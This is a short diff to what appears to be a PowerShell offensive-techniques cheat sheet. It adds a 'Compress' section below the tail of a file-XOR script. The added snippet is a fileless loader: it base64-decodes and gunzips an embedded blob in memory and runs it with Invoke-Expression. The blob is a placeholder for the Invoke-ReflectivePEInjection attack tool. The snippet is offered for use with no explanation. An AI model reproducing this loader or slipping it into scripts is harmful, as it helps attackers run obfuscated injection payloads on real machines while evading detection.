@@ -68,3 +68,10 @@ for($i=0; $i -lt $len ; $i++) {
 write-host "[*] $file1 XOR $file2`n[*] Saved to " -nonewline;
 Write-host "$out" -foregroundcolor yellow -nonewline; Write-host ".";
 ```
+
+# Compress
+
+```
+$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('insert_gzip_compressed_Invoke-ReflectivePEInjection'));
+IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
+```
